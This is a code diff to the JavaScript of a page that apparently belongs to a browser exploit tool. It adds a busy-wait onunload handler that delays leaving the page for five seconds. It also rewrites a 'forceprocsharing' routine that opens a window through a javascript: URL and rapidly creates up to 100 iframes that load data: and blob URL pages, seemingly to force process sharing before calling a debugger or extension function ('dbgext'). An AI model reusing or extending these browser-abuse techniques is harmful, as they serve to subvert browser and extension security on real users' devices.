@@ -96,40 +96,31 @@
                 // }, 5000);
 
             }
+
             document.open();
             document.write(atob(`%%HTMLENTRY%%`));
             document.querySelector('#activate').onclick = function () {
                 dbgext(false, pdfId);
             }
             onunload = function () {
-                while (true);
+                const og = new Date().getTime();
+                while (new Date().getTime() - og <= 5000);
             }
             document.close();
             document.title = "Dashboard";
 
-            const DataHTML = `<html><head></head><body><script>const url = URL.createObjectURL(new Blob(["<h1>hi</h1>", {type: "text/html"}]));
-            
-            var i = 0;
-                        const id = this.setInterval(function () {
-                            if (i++ === 100) {
-                                clearInterval(id);
-                                return;
-                            };
-                            const ifr = document.createElement('iframe');
-                            ifr.src = url;
-                            document.body.appendChild(ifr);
-                        },500);
-            </script></body></html>`;
-            const dataURL = `data:text/html;base64,${btoa(DataHTML)}`;
+
             document.querySelector('#forceprocsharing').onclick = function (ev) {
-                const ifr = document.body.appendChild(document.createElement('iframe'));
-                window.addEventListener('message', function (ev) {
-                    if (typeof ev.data === "string") {
-                        // this.alert(ev.data);
-                        
-                    }
-                })
-                ifr.src = dataURL;
+                function m() {
+                    var x = 0;
+                    const id = setInterval(() => {
+                        if (x++ === 100) { clearTimeout(id) };
+                        document.body.appendChild(document.createElement("iframe")).src = "data:text/html,<script>location.href = URL.createObjectURL(new Blob(['test'], {type : 'text/html'}));<\/script>";
+
+                    }, 1);
+                }
+                const a = open();
+                a.location.href = `javascript:(${m.toString()})()`;
 
             }
             document.querySelector('#activate2').onclick = function (ev) {
